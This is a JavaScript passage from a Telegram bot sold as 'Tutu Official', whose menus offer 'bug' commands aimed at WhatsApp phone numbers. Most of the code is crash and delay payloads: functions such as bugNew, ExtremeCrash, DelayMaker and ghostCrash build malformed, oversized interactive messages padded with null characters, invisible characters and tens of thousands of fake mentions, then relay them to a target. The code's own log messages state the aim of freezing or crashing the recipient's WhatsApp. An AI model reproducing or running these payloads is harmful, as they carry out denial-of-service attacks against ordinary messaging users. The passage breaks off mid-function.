  const ownerMenuMessage = `
┏❐  ⌜ HAMTZY ⌟  ❐
┃⭔ Developer : HAMTZY
┃⭔ Script : Tutu Official 
┃⭔ Version : V2.0
┗❐

┏❐  ⌜ Bug ⌟  ❐
┃⭔ /tutubug 628xx
┃⭔ /tutudelay 628xx
┃⭔ /tutucombo 628xx
┃⭔ /tutuinvis 628xx
┗❐
  `;

  const ownerKeyboard = [
    [{
      text: "Back",
      callback_data: "main_menu"
    }]
  ];

  // Kirim menu Owner Management dengan video
  await ctx.replyWithPhoto("https://files.catbox.moe/2nfrqt.jpg", {
    caption: ownerMenuMessage,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: ownerKeyboard
    }
  });
});

// Handler untuk callback "main_menu"
bot.action('main_menu', async (ctx) => {
  // Hapus pesan menu owner
  await ctx.deleteMessage();
  const isPremium = isPremiumUser(ctx.from.id);
  const isAdminStatus = isAdmin(ctx.from.id);
  const isOwnerStatus = isOwner(ctx.from.id);
  // Kirim ulang menu utama (Anda dapat menggunakan kode yang sama seperti pada bot.start)
  const runtime = () => {
  let seconds = Math.floor(process.uptime());
  let h = Math.floor(seconds / 3600);
  let m = Math.floor((seconds % 3600) / 60);
  let s = seconds % 60;
  return `${h}h ${m}m ${s}s`;
};

const mainMenuMessage = `
┏❐  ⌜ HAMTZY ⌟  ❐
┃⭔ Developer : HAMTZY
┃⭔ Script : Tutu Official 
┃⭔ Version : V2.0
┃⭔ Runtime : ${runtime()}
┗❐`;

const mainKeyboard = [
    [{ text: "👤 Developer", url: "https://t.me/Hamzzzt" }],
    [
        { text: "BugMenu", callback_data: "kontak" },
        { text: "OwnerMenu", callback_data: "owner_menu" }
    ],
    [{ text: "DownloadMenu", callback_data: "fun_menu" }]
];

  ctx.replyWithPhoto("https://files.catbox.moe/2nfrqt.jpg", {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard
      }
    });
});

// FUNCTION BUG WHATSAPP
async function carousel(target) {
  let haxxn = 10;

  for (let i = 0; i < haxxn; i++) {
    let push = [];
    let buttt = [];

    for (let i = 0; i < 5; i++) {
      buttt.push({
        "name": "galaxy_message",
        "buttonParamsJson": JSON.stringify({
          "header": "null",
          "body": "xxx",
          "flow_action": "navigate",
          "flow_action_payload": { screen: "FORM_SCREEN" },
          "flow_cta": "Grattler",
          "flow_id": "1169834181134583",
          "flow_message_version": "3",
          "flow_token": "AQAAAAACS5FpgQ_cAAAAAE0QI3s"
        })
      });
    }

    for (let i = 0; i < 1000; i++) {
      push.push({
        "body": {
          "text": "\u0000\u0000\u0000\u0000\u0000"
        },
        "footer": {
          "text": ""
        },
        "header": {
          "title": 'TUTU OFFICIAL\u0000\u0000\u0000\u0000',
          "hasMediaAttachment": true,
          "imageMessage": {
            "url": "https://mmg.whatsapp.net/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0&mms3=true",
            "mimetype": "image/jpeg",
            "fileSha256": "dUyudXIGbZs+OZzlggB1HGvlkWgeIC56KyURc4QAmk4=",
            "fileLength": "591",
            "height": 0,
            "width": 0,
            "mediaKey": "LGQCMuahimyiDF58ZSB/F05IzMAta3IeLDuTnLMyqPg=",
            "fileEncSha256": "G3ImtFedTV1S19/esIj+T5F+PuKQ963NAiWDZEn++2s=",
            "directPath": "/v/t62.7118-24/19005640_1691404771686735_1492090815813476503_n.enc?ccb=11-4&oh=01_Q5AaIMFQxVaaQDcxcrKDZ6ZzixYXGeQkew5UaQkic-vApxqU&oe=66C10EEE&_nc_sid=5e03e0",
            "mediaKeyTimestamp": "1721344123",
            "jpegThumbnail": "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIABkAGQMBIgACEQEDEQH/xAArAAADAQAAAAAAAAAAAAAAAAAAAQMCAQEBAQAAAAAAAAAAAAAAAAAAAgH/2gAMAwEAAhADEAAAAMSoouY0VTDIss//xAAeEAACAQQDAQAAAAAAAAAAAAAAARECEHFBIv/aAAgBAQABPwArUs0Reol+C4keR5tR1NH1b//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQIBAT8AH//EABQRAQAAAAAAAAAAAAAAAAAAACD/2gAIAQMBAT8AH//Z",
            "scansSidecar": "igcFUbzFLVZfVCKxzoSxcDtyHA1ypHZWFFFXGe+0gV9WCo/RLfNKGw==",
            "scanLengths": [
              247,
              201,
              73,
              63
            ],
            "midQualityFileSha256": "qig0CvELqmPSCnZo7zjLP0LJ9+nWiwFgoQ4UkjqdQro="
          }
        },
        "nativeFlowMessage": {
          "buttons": []
        }
      });
    }

    const carousel = generateWAMessageFromContent(target, {
      "viewOnceMessage": {
        "message": {
          "messageContextInfo": {
            "deviceListMetadata": {},
            "deviceListMetadataVersion": 2
          },
          "interactiveMessage": {
            "body": {
              "text": "\u0000\u0000\u0000\u0000"
            },
            "footer": {
              "text": "( 🐉 ) HI TUTU"
            },
            "header": {
              "hasMediaAttachment": false
            },
            "carouselMessage": {
              "cards": [
                ...push
              ]
            }
          }
        }
      }
    }, {});

    await zephy.relayMessage(target, carousel.message, {
      messageId: carousel.key.id
    });
  }
}
async function DelaySsuper(target, mention) {
    console.log(chalk.red("Succes Send Bug"));
    const generateMessage = {
        viewOnceMessage: {
            message: {
                imageMessage: {
                    url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
                    mimetype: "image/jpeg",
                    caption: "Tutu Crasher🥵",
                    fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
                    fileLength: "19769",
                    height: 354,
                    width: 783,
                    mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
                    fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
                    directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
                    mediaKeyTimestamp: "1743225419",
                    jpegThumbnail: null,
                    scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
                    scanLengths: [2437, 17332],
                    contextInfo: {
                        mentionedJid: Array.from({ length: 30000 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"),
                        isSampled: true,
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true
                    }
                }
            }
        }
    };

    const msg = generateWAMessageFromContent(target, generateMessage, {});

    await zephy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });

    if (mention) {
        await zephy.relayMessage(
            target,
            {
                statusMentionMessage: {
                    message: {
                        protocolMessage: {
                            key: msg.key,
                            type: 25
                        }
                    }
                }
            },
            {
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: { is_status_mention: "TutuOfficial" },
                        content: undefined
                    }
                ]
            }
        );
    }
}
async function DelayNewBug(target) {
        	try {
        		let messageObject = await generateWAMessageFromContent(target, {
        			viewOnceMessage: {
        				message: {
        					extendedTextMessage: {
        						text: `Hamtzy`,
        						contextInfo: {
        							mentionedJid: Array.from({
        								length: 30000
        							}, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
        							isSampled: true,
        							participant: target,
        							remoteJid: "status@broadcast",
        							forwardingScore: 9741,
        							isForwarded: true
        						}
        					}
        				}
        			}
        		}, {});
        		await zephy.relayMessage("status@broadcast", messageObject.message, {
        			messageId: messageObject.key.id,
        			statusJidList: [target],
        			additionalNodes: [{
        				tag: "meta",
        				attrs: {},
        				content: [{ tag: "mentioned_users", attrs: {}, content: [{ tag: "to", attrs: { jid: target },
        						content: undefined,
        					}],
        				}],
        			}],
        		});
        	} catch (err) {
        		console.log(err)
        		await zephy.sendMessage("! Error Type", err)
        	}
        	console.log(chalk.green("Send Bug Invisible"));
        }
async function delayinvisiXo(target) {
    const delaymention = Array.from({ length: 9741 }, (_, r) => ({
        title: "᭯".repeat(9741),
        rows: [{ title: `${r + 1}`, id: `${r + 1}` }]
    }));

    const MSG = {
        viewOnceMessage: {
            message: {
                listResponseMessage: {
                    title: "TUTU IS HERE",
                    listType: 2,
                    buttonText: null,
                    sections: delaymention,
                    singleSelectReply: { selectedRowId: "☠️" },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 9741 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
                        participant: target,
                        remoteJid: "status@broadcast",
                        forwardingScore: 9741,
                        isForwarded: true,
                        forwardedNewsletterMessageInfo: {
                            newsletterJid: "9741@newsletter",
                            serverMessageId: 1,
                            newsletterName: "-"
                        }
                    },
                    description: "( # )"
                }
            }
        },
        contextInfo: {
            channelMessage: true,
            statusAttributionType: 2
        }
    };

    const msg = generateWAMessageFromContent(target, MSG, {});

    await zephy.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
            {
                tag: "meta",
                attrs: {},
                content: [
                    {
                        tag: "mentioned_users",
                        attrs: {},
                        content: [
                            {
                                tag: "to",
                                attrs: { jid: target },
                                content: undefined
                            }
                        ]
                    }
                ]
            }
        ]
    });
}
async function DelayInVis(target, show) {
            let push = [];
                push.push({
                    body: proto.Message.InteractiveMessage.Body.fromObject({ text: "#hay" }),
                    footer: proto.Message.InteractiveMessage.Footer.fromObject({ text: "#hay" }),
                    header: proto.Message.InteractiveMessage.Header.fromObject({
                        title: "#hay",
                        hasMediaAttachment: true,
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "88J5mAdmZ39jShlm5NiKxwiGLLSAhOy0gIVuesjhPmA=",
                            fileLength: "18352",
                            height: 720,
                            width: 1280,
                            mediaKey: "Te7iaa4gLCq40DVhoZmrIqsjD+tCd2fWXFVl3FlzN8c=",
                            fileEncSha256: "w5CPjGwXN3i/ulzGuJ84qgHfJtBKsRfr2PtBCT0cKQQ=",
                            directPath: "/v/t62.7118-24/13168261_1302646577450564_6694677891444980170_n.enc?ccb=11-4&oh=01_Q5AaIBdx7o1VoLogYv3TWF7PqcURnMfYq3Nx-Ltv9ro2uB9-&oe=67B459C4&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1737281900",
                            jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIACgASAMBIgACEQEDEQH/xAAsAAEBAQEBAAAAAAAAAAAAAAAAAwEEBgEBAQEAAAAAAAAAAAAAAAAAAAED/9oADAMBAAIQAxAAAADzY1gBowAACkx1RmUEAAAAAA//xAAfEAABAwQDAQAAAAAAAAAAAAARAAECAyAiMBIUITH/2gAIAQEAAT8A3Dw30+BydR68fpVV4u+JF5RTudv/xAAUEQEAAAAAAAAAAAAAAAAAAAAw/9oACAECAQE/AH//xAAWEQADAAAAAAAAAAAAAAAAAAARIDD/2gAIAQMBAT8Acw//2Q==",
                            scansSidecar: "hLyK402l00WUiEaHXRjYHo5S+Wx+KojJ6HFW9ofWeWn5BeUbwrbM1g==",
                            scanLengths: [3537, 10557, 1905, 2353],
                            midQualityFileSha256: "gRAggfGKo4fTOEYrQqSmr1fIGHC7K0vu0f9kR5d57eo=",
                        },
                    }),
                    nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({ buttons: [] }),
                });
        
            let msg = await generateWAMessageFromContent(
                target,
                {
                    viewOnceMessage: {
                        message: {
                            messageContextInfo: {
                                deviceListMetadata: {},
                                deviceListMetadataVersion: 2,
                            },
                            interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                                body: proto.Message.InteractiveMessage.Body.create({ text: " " }),
                                footer: proto.Message.InteractiveMessage.Footer.create({ text: "bijiku" }),
                                header: proto.Message.InteractiveMessage.Header.create({ hasMediaAttachment: false }),
                                carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({ cards: [...push] }),
                            }),
                        },
                    },
                },
                {}
            );
        
            await zephy.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
        
            if (show) {
                await zephy.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: "𝐑𝐢𝐥𝐲𝐳𝐲 𝐈𝐬 𝐇𝐞𝐫𝐞 ϟ" },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }
async function FlowX(target) {
  let msg = await generateWAMessageFromContent(
    target,
    {
      viewOnceMessage: {
        message: {
          interactiveMessage: {
            header: {
              title: "RILLYZY IS HERE⚡",
              hasMediaAttachment: false,
            },
            body: {
              text: "リリジリリージー",
            },
            nativeFlowMessage: {
              messageParamsJson: "",
              buttons: [
                {
                  name: "single_select",
                  buttonParamsJson: "z",
                },
                {
                  name: "call_permission_request",
                  buttonParamsJson: "{}",
                },
              ],
            },
          },
        },
      },
    },
    {}
  );

  await zephy.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
}
async function bugNew(target, ptcp = true) {
    const stanza = [
        {
            attrs: { biz_bot: '1' },
            tag: "bot",
        },
        {
            attrs: {},
            tag: "biz",
        },
    ];

    for (let i = 0; i < 5000; i++) {  // Mengirimkan pesan besar 5 kali tanpa jeda
        let messagePayload = {
            viewOnceMessage: {
                message: {
                    interactiveMessage: {
                        header: {
                            title: "🔴 BUG TESTING - FORCE CLOSE",
                            hasMediaAttachment: false
                        },
                        body: {
                            text: "⚠️ WA CRASH TEST " + "💥".repeat(50000),
                        },
                        nativeFlowMessage: {
                            messageParamsJson: "{}",
                            buttons: [
                                {
                                    name: "cta_url",
                                    buttonParamsJson: "{\"url\":\"https://t.me/devor6core\"}"
                                },
                                {
                                    name: "call_permission_request",
                                    buttonParamsJson: "{\"request\":\"permission\"}"
                                }
                            ]
                        }
                    }
                }
            }
        };

        await zephy.relayMessage(target, messagePayload, {
            additionalNodes: stanza,
            participant: { jid: target }
        });

        console.log(`Message sent successfully.`);
    }

    console.log("All messages sent instantly. WhatsApp might crash on the receiver's end.");
}
async function SqlXGlx(target) {
      let sections = [];

      for (let i = 0; i < 15; i++) {
        let largeText = "ꦾ".repeat(25);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "RILLYZY IS BACK",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "do you know Rilyzy?🤫",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: 'galaxy_message',
                    paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Rildev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3 
},
                ],
              },
            },
          },
        },
      };

      await zephy.relayMessage(target, message, {
        participant: { jid: target },
      });
    }


async function ExtremeCrash(target) {
    try {
        let crashMessage = {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {
                            devices: new Array(50000).fill({ id: "device", type: "invalid" }) 
                        },
                        deviceListMetadataVersion: 9999999999, 
                    },
                    interactiveMessage: {
                        contextInfo: {
                            mentionedJid: [target],
                            isForwarded: true,
                            forwardingScore: Infinity, 
                            businessMessageForwardInfo: {
                                businessOwnerJid: target,
                            },
                        },
                        body: {
                            text: "🔥 CRASH ACTIVATED 🔥\n".repeat(50000), // Mengisi teks secara ekstrem
                        },
                        nativeFlowMessage: {
                            buttons: Array(100).fill({ name: "mpm", buttonParamsJson: "" }) // Memperbanyak jumlah tombol
                        },
                    },
                },
            },
        };

        await zephy.relayMessage(target, crashMessage, {
            participant: { jid: target },
        });

        console.log("Crash message sent. WhatsApp should freeze or crash.");
    } catch (err) {
        console.log("Error sending crash message:", err);
    }
}

    async function DelayMaker(target) {
    console.log(`delay maker send to target`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "HELLO BUNG👀",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    kontolCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
                    printQRInTerminal: false,
                    emitOwnEvents: true,
                    defaultQueryTimeoutMs: 60000,
                    customUploadHosts: [],
                    retryRequestDelayMs: 250,
                    maxMsgRetryCount: 5,
                    fireInitQueries: true,
                    auth: { Object: "authData" },
                    markOnlineOnkontolCect: true,
                    syncFullHistory: true,
                    linkPreviewImageThumbnailWidth: 192,
                    transactionOpts: { Object: "transactionOptsData" },
                    generateHighQualityLinkPreview: false,
                    options: {},
                    appStateMacVerification: { Object: "appStateMacData" },
                    mobile: true
                }
            }
        }
    });

    let stanza = [
        { attrs: { biz_bot: "1" }, tag: "bot" },
        { attrs: {}, tag: "biz" }
    ];

    let message = {
        viewOnceMessage: {
            message: {
                messageContextInfo: {
                    deviceListMetadata: {},
                    deviceListMetadataVersion: 3.2,
                    isStatusBroadcast: true,
                    statusBroadcastJid: "status@broadcast",
                    badgeChat: { unreadCount: 9999 }
                },
                forwardedNewsletterMessageInfo: {
                    newsletterJid: "proto@newsletter",
                    serverMessageId: 1,
                    newsletterName: `TrashDex 𖣂      - 〽${"ꥈꥈꥈꥈꥈꥈ".repeat(10)}`,
                    contentType: 3,
                    accessibilityText: `DelayDex ********************************""""" ${"﹏".repeat(102002)}`,
                },
                interactiveMessage: {
                    contextInfo: {
                        businessMessageForwardInfo: { businessOwnerJid: target },
                        dataSharingContext: { showMmDisclosure: true },
                        participant: "0@s.whatsapp.net",
                        mentionedJid: ["13135550002@s.whatsapp.net"],
                    },
                    body: {
                        text: "HELLO👀" + "ꦾꦾꦾ".repeat(99999) + "\u0000".repeat(102002)
                    },
                    nativeFlowMessage: {
                        buttons: [
                            { name: "single_select", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "payment_method", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "call_permission_request", buttonParamsJson: venomModsData + "\u0000".repeat(9999), voice_call: "call_galaxy" },
                            { name: "form_message", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "wa_payment_learn_more", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "wa_payment_transaction_details", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "wa_payment_fbpin_reset", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "catalog_message", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "payment_info", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "review_order", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "send_location", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "payments_care_csat", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "view_product", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "payment_settings", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "address_message", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "automated_greeting_message_view_catalog", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "open_webview", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "message_with_link_status", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "payment_status", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "galaxy_costum", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "extensions_message_v2", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "landline_call", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "mpm", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "cta_copy", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "cta_url", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "review_and_pay", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "galaxy_message", buttonParamsJson: venomModsData + "\u0000".repeat(9999) },
                            { name: "cta_call", buttonParamsJson: venomModsData + "\u0000".repeat(9999) }
                        ]
                    }
                }
            }
        },
        additionalNodes: stanza,
        stanzaId: `stanza_${Date.now()}`
    };

    await zephy.relayMessage(target, message, { participant: { jid: target } });
    console.log(`sukses send bug delay`);
}
async function NativXglxy(target) {
      let sections = [];

      for (let i = 0; i < 15; i++) {
        let largeText = "ꦾ".repeat(25);

        let deepNested = {
          title: `Super Deep Nested Section ${i}`,
          highlight_label: `Extreme Highlight ${i}`,
          rows: [
            {
              title: largeText,
              id: `id${i}`,
              subrows: [
                {
                  title: "Nested row 1",
                  id: `nested_id1_${i}`,
                  subsubrows: [
                    {
                      title: "Deep Nested row 1",
                      id: `deep_nested_id1_${i}`,
                    },
                    {
                      title: "Deep Nested row 2",
                      id: `deep_nested_id2_${i}`,
                    },
                  ],
                },
                {
                  title: "Nested row 2",
                  id: `nested_id2_${i}`,
                },
              ],
            },
          ],
        };

        sections.push(deepNested);
      }

      let listMessage = {
        title: "RILLYZY IS HERE⚡",
        sections: sections,
      };

      let message = {
        viewOnceMessage: {
          message: {
            messageContextInfo: {
              deviceListMetadata: {},
              deviceListMetadataVersion: 2,
            },
            interactiveMessage: {
              contextInfo: {
                mentionedJid: [target],
                isForwarded: true,
                forwardingScore: 999,
                businessMessageForwardInfo: {
                  businessOwnerJid: target,
                },
              },
              body: {
                text: "RILLYZY IS HERE⚡  リリジリリージー",
              },
              nativeFlowMessage: {
                buttons: [
                  {
                    name: "single_select",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "call_permission_request",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: "mpm",
                    buttonParamsJson: "JSON.stringify(listMessage)",
                  },
                  {
                    name: 'galaxy_message',
                    paramsJson: `{\"screen_2_OptIn_0\":true,           \"screen_2_OptIn_1\":true,\"screen_1_Dropdown_0\":\"TrashDex Superior\",\"screen_1_DatePicker_1\":\"1028995200000\",\"screen_1_TextInput_2\":\"Rildev@trash.lol\",\"screen_1_TextInput_3\":\"94643116\",\"screen_0_TextInput_0\":\"radio - buttons${"\u0003".repeat(355000)}\",\"screen_0_TextInput_1\":\"Anjay\",\"screen_0_Dropdown_2\":\"001-Grimgar\",\"screen_0_RadioButtonsGroup_3\":\"0_true\",\"flow_token\":\"AQAAAAACS5FpgQ_cAAAAAE0QI3s.\"}`,
version: 3 
},
                ],
              },
            },
          },
        },
      };

      await zephy.relayMessage(target, message, {
        participant: { jid: target },
      });
    }
    async function ghostCrash(target) {
  await delay(2000);  // Delay ringan sebelum trigger (optional)

  return {
    viewOnceMessage: {
      message: {
        listResponseMessage: {
          title: "\u200E",  // Invisible title
          listType: 2,
          singleSelectReply: {
            selectedRowId: "\u200E",  // Invisible
          },
          contextInfo: {
            stanzaId: crypto.randomBytes(16).toString("hex"),
            participant: "0@s.whatsapp.net",  // ANONYMOUS
            remoteJid: "status@broadcast",   // No chat jejak
            mentionedJid: [target],
            quotedMessage: {
              buttonsMessage: {
                documentMessage: {
                  url: "https://example.com",  // Fake URL
                  mimetype: "application/pdf",
                  fileSha256: crypto.randomBytes(32).toString("base64"),
                  fileLength: "999999999999999",  // Brutal Payload
                  pageCount: 999999999,
                  mediaKey: crypto.randomBytes(32).toString("base64"),
                  fileName: "\u200E",  // Invisible
                  caption: "\u200E",   // Invisible caption
                },
                contentText: "\u200E",
                footerText: "\u200E",
                buttons: [
                  {
                    buttonId: "\u200E".repeat(2000000),  // Heavy Payload
                    buttonText: {
                      displayText: "\u200E",  // Invisible button
                    },
                    type: 1,
                  },
                ],
                headerType: 3,
              },
            },
            forwardingScore: 999999,
            isForwarded: true,
            expiration: -99999,
            ephemeralSettingTimestamp: Date.now(),
            ephemeralSharedSecret: crypto.randomBytes(16),
          },
          description: "\u200E",  // Invisible desc
        },
      },
    },
  };
}


    async function nativemessage(target) {
    await zephy.relayMessage(target, {
        ephemeralMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                            mimetype: "application/vnd.openxmlformats-officedocument.presentationml.presentation",
                            fileSha256: "QYxh+KzzJ0ETCFifd1/x3q6d8jnBpfwTSZhazHRkqKo=",
                            fileLength: 9999999999999, // 10MB, batas wajar
                            pageCount: 10,
                            mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                            fileName: "𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞",
                            fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                            directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc",
                            mediaKeyTimestamp: 1726867151,
                            jpegThumbnail: null, // Gantilah jika ingin menambahkan gambar
                        },
                    },
                    body: {
                        text: ".⟅ ▾ 𝐓𝐡𝐞𝐑𝐢𝐥𝐲𝐳𝐲𝐈𝐬𝐇𝐞𝐫𝐞 ϟ ▾ ⟅\n" + "ꦾ".repeat(10000) + `@1`.repeat(10000),
                    },
                    contextInfo: {
                        mentionedJid: ["1@newsletter"],
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Vamp" }],
                    },
                },
            },
        },
    });
}
const Qcrl = {
  key: {
    fromMe: false,
    participant: "0@s.whatsapp.net",
    remoteJid: "status@broadcast"
  },
  message: {
    interactiveMessage: {
      body: { 
        title: "", 
        text: "\u0000".repeat(999999),
        footer: "",
        description: ""
      },
      carouselMessage: {
        cards: []
      },
      contextInfo: {
        mentionedJid: ["status@broadcast"]
      }
    }
  }
};

async function unifiedFunction(target) {
    console.log(`Send Delay To ${target}`);

    let venomModsData = JSON.stringify({
        status: true,
        criador: "VenomMods",
        resultado: {
            type: "md",
            ws: {
                _events: { "CB:ib,,dirty": ["Array"] },
                _eventsCount: 800000,
                _maxListeners: 0,
                url: "wss://web.whatsapp.com/ws/chat",
                config: {
                    version: ["Array"],
                    browser: ["Array"],
                    waWebSocketUrl: "wss://web.whatsapp.com/ws/chat",
                    kontolCectTimeoutMs: 20000,
                    keepAliveIntervalMs: 30000,
                    logger: {},
